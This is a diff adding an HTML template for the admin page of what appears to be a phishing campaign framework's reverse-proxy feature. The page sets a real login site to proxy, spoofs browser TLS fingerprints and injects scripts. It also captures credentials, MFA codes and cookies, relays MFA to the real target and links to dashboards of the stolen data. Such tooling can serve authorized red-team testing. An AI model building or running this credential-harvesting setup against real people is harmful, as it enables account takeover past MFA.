@@ -1,0 +1,186 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="max-w-6xl mx-auto py-8">
+
+  <!-- Navigation Back Link -->
+  <div class="mb-6 font-mono-brutal">
+    <a href="{{ url_for('campaigns_admin.admin_campaign_info', cid=campaign.id) }}" class="inline-flex items-center text-xs font-bold text-gray-700 dark:text-gray-300 hover:text-pure-black dark:hover:text-stark-white transition-colors">
+      <svg class="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M15 19l-7-7 7-7"/></svg>
+      [ BACK TO CAMPAIGN INFO ]
+    </a>
+  </div>
+  <h1 class="text-2xl font-bold mb-4">Reverse Proxy Configuration</h1>
+  <p class="text-gray-600 mb-6">Campaign: {{ campaign.name }}</p>
+
+  <form method="POST" action="/admin/campaign/{{ campaign.id }}/proxy-config" class="space-y-6">
+    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+
+    <!-- Target URL -->
+    <div>
+      <label class="block font-medium mb-1">Target URL (the real site to proxy)</label>
+      <input type="url" name="target_url" value="{{ config.target_url or '' }}"
+             placeholder="https://www.facebook.com/login"
+             class="w-full border rounded px-3 py-2" required>
+      <p class="text-sm text-gray-500 mt-1">All traffic to /proxy/{{ campaign.id }}/ will be forwarded here.</p>
+    </div>
+
+    <!-- Upstream proxy for egress -->
+    <div>
+      <label class="block font-medium mb-1">Upstream Proxy (egress)</label>
+      <input type="text" name="upstream_proxy" value="{{ config.upstream_proxy or '' }}"
+             placeholder="http://user:pass@proxy.example.com:8080 or socks5://127.0.0.1:1080"
+             class="w-full border rounded px-3 py-2">
+      <p class="text-sm text-gray-500 mt-1">
+        All forwarded requests to the target site will be routed through this proxy.
+        Leave blank to connect directly.
+      </p>
+    </div>
+
+    <!-- Renderer selection -->
+    <div>
+      <label class="block font-medium mb-1">Renderer</label>
+      <select name="renderer" class="w-full border rounded px-3 py-2">
+        <option value="" {% if not config.renderer %}selected{% endif %}>Default (httpx)</option>
+        <option value="playwright" {% if config.renderer == 'playwright' %}selected{% endif %}>Browser-in-the-Middle (Playwright)</option>
+      </select>
+      <p class="text-sm text-gray-500 mt-1">
+        Playwright renders JavaScript-heavy targets and detects CAPTCHAs. POST requests still fall back to httpx.
+      </p>
+    </div>
+
+    <!-- TLS fingerprint impersonation -->
+    <div>
+      <label class="block font-medium mb-1">TLS Fingerprint</label>
+      <input list="tls_fingerprint_options" name="tls_fingerprint"
+             value="{{ config.tls_fingerprint or '' }}"
+             placeholder="Default (httpx)"
+             class="w-full border rounded px-3 py-2">
+      <datalist id="tls_fingerprint_options">
+        <option value="">Default (httpx)</option>
+        <option value="chrome120">Chrome 120</option>
+        <option value="chrome124">Chrome 124</option>
+        <option value="chrome131">Chrome 131</option>
+        <option value="chrome136">Chrome 136</option>
+        <option value="chrome131_android">Chrome 131 Android</option>
+        <option value="firefox133">Firefox 133</option>
+        <option value="firefox135">Firefox 135</option>
+        <option value="safari17_0">Safari 17.0</option>
+        <option value="safari17_2_ios">Safari 17.2 iOS</option>
+        <option value="safari18_0">Safari 18.0</option>
+        <option value="safari18_0_ios">Safari 18.0 iOS</option>
+        <option value="edge101">Edge 101</option>
+      </datalist>
+      <p class="text-sm text-gray-500 mt-1">
+        Spoof the upstream TLS/JA3 fingerprint to match a real browser. Pick a preset or type any curl_cffi impersonation string. Leave blank to use the default httpx client.
+      </p>
+    </div>
+
+    <!-- Static prefix for JS injection -->
+    <div>
+      <label class="block font-medium mb-1">Static Prefix</label>
+      <input type="text" name="static_prefix" value="{{ config.static_prefix or 'x9ut17jbqa' }}"
+             class="w-full border rounded px-3 py-2">
+      <p class="text-sm text-gray-500 mt-1">Prefix for injected JS/CSS paths (mimics goblin's StaticPrefix).</p>
+    </div>
+
+    <!-- Plugins -->
+    <div>
+      <label class="block font-medium mb-2">Enabled Plugins</label>
+      <p class="text-sm text-gray-500 mb-3">
+        Select declarative YAML plugins to load before inline rules. Plugins live in
+        <code>dropoutjeep_lib/proxy/plugins/</code>.
+      </p>
+      <div class="space-y-2 border rounded p-3 bg-gray-50">
+        {% if plugins %}
+          {% for plugin in plugins %}
+          <label class="flex items-start gap-3">
+            <input type="checkbox" name="plugins" value="{{ plugin.name }}"
+                   {% if plugin.name in selected_plugins %}checked{% endif %}
+                   class="mt-1">
+            <div>
+              <span class="font-medium">{{ plugin.title }}</span>
+              <span class="text-xs text-gray-500">({{ plugin.filename }})</span>
+              {% if plugin.description %}
+              <p class="text-sm text-gray-600">{{ plugin.description }}</p>
+              {% endif %}
+            </div>
+          </label>
+          {% endfor %}
+        {% else %}
+          <p class="text-sm text-gray-500">No plugins found in the plugins directory.</p>
+        {% endif %}
+      </div>
+    </div>
+
+    <!-- Capture toggles -->
+    <div class="border rounded p-4 bg-gray-50 space-y-4">
+      <h3 class="font-medium">Capture Options</h3>
+      <label class="flex items-center gap-2">
+        <input type="checkbox" name="capture_credentials" {% if config.capture_credentials %}checked{% endif %} class="w-4 h-4">
+        <span>Capture credentials / MFA codes from POST bodies</span>
+      </label>
+      <label class="flex items-center gap-2">
+        <input type="checkbox" name="capture_cookies" {% if config.capture_cookies %}checked{% endif %} class="w-4 h-4">
+        <span>Capture request/response cookies</span>
+      </label>
+      <label class="flex items-center gap-2">
+        <input type="checkbox" name="mfa_relay_enabled" {% if config.mfa_relay_enabled %}checked{% endif %} class="w-4 h-4">
+        <span>Enable MFA relay (replay username+password with MFA code to real target)</span>
+      </label>
+      <div>
+        <label class="block text-sm font-medium mb-1">Username field names (comma-separated, blank = defaults)</label>
+        <input type="text" name="username_field_names"
+               value="{{ (config.username_field_names or []) | join(', ') }}"
+               placeholder="username, email, login"
+               class="w-full border rounded px-3 py-2">
+      </div>
+      <div>
+        <label class="block text-sm font-medium mb-1">Password field names (comma-separated, blank = defaults)</label>
+        <input type="text" name="password_field_names"
+               value="{{ (config.password_field_names or []) | join(', ') }}"
+               placeholder="password, passwd, pwd, pass"
+               class="w-full border rounded px-3 py-2">
+      </div>
+      <div>
+        <label class="block text-sm font-medium mb-1">MFA field names (comma-separated, blank = defaults)</label>
+        <input type="text" name="mfa_field_names"
+               value="{{ (config.mfa_field_names or []) | join(', ') }}"
+               placeholder="code, token, otp, mfa, 2fa, totp"
+               class="w-full border rounded px-3 py-2">
+      </div>
+    </div>
+
+    <!-- Rules -->
+    <div>
+      <label class="block font-medium mb-2">Content Manipulation Rules</label>
+      <p class="text-sm text-gray-500 mb-3">Each rule modifies proxied requests/responses. JSON array.</p>
+      <textarea name="rules_json" rows="12" class="w-full border rounded px-3 py-2 font-mono text-sm">{{ rules_json }}</textarea>
+    </div>
+
+    <div class="flex gap-3">
+      <button type="submit" class="bg-blue-600 text-white px-6 py-2 rounded hover:bg-blue-700">Save Config</button>
+      <a href="{{ url_for('campaigns_admin.admin_campaign_info', cid=campaign.id) }}" class="px-6 py-2 border rounded hover:bg-gray-50">Cancel</a>
+    </div>
+  </form>
+
+  <!-- Test proxy -->
+  <div class="mt-8 p-4 border rounded bg-gray-50">
+    <h3 class="font-medium mb-2">Proxy URL</h3>
+    <p class="text-sm">Your proxy is accessible at:</p>
+    <code class="block mt-1 p-2 bg-white border rounded text-sm">
+      {{ base_url }}/proxy/{{ campaign.id }}/
+    </code>
+    <p class="text-sm mt-2">Per-recipient tracking URLs use:</p>
+    <code class="block mt-1 p-2 bg-white border rounded text-sm">
+      {{ base_url }}/proxy/{{ campaign.id }}/t/&lt;recipient_token&gt;/
+    </code>
+  </div>
+
+  <!-- Capture dashboards -->
+  <div class="mt-6 flex gap-3">
+    <a href="{{ url_for('admin_campaign_cookies', cid=campaign.id) }}" class="px-4 py-2 border rounded hover:bg-gray-50">View Cookies</a>
+    <a href="{{ url_for('admin_campaign_credentials', cid=campaign.id) }}" class="px-4 py-2 border rounded hover:bg-gray-50">View Credentials</a>
+  </div>
+</div>
+</div>
+{% endblock %}
